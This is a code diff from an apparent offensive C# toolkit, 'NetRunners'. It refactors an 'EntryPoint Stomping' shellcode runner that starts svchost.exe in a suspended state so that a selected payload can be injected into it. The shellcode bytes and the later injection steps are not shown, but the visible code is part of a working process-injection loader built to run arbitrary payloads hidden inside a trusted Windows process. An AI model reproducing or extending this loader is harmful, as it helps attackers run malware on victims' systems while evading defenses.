@@ -12,7 +12,7 @@ namespace NetRunners.Runners
     /// <summary>
     /// This class contains the EntryPoint Stomping Shellcode Runner (Special Thanks 2 cpu0x00!)
     /// </summary>
-    public class EntryPointStompingRunner : IRunner
+    public class EntryPointStompingProcessInjectionRunner : IRunner
     {
         public void Run()
         {
@@ -30,16 +30,19 @@ namespace NetRunners.Runners
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
             PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
-            byte[] buf = GetPayload();
-            int sBuf = GetSize();
-            
+            byte[] buf = SelectPayloadArchitecture();
+            int sBuf = SelectPayloadSize();
+
             try
             {
                 // here we are
-                Console.WriteLine("[+] EntryPoint Stomping Shellcode Runner selected!");
+                string techniqueName = "EntryPoint Stomping Process Injection (x64)";
+                string targetProcess = "svchost.exe";                       // suffix needed
+                PrintTechniqueInfo(techniqueName, targetProcess);
 
-                // create suspended svchost process
-                result = CreateProcessA(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, 0, 0x4, IntPtr.Zero, null, ref si, out pi);
+                // create suspended svchost process                         // TO-DO x86 version
+                result = CreateProcessA(null, $"C:\\Windows\\System32\\{targetProcess}", IntPtr.Zero, IntPtr.Zero, 0, 0x4, IntPtr.Zero, null, ref si, out pi);
+                
                 if (result == 0) // false
                     throw new InvalidOperationException($"CreateProcessA failed with error code: {Marshal.GetLastWin32Error()}");
 
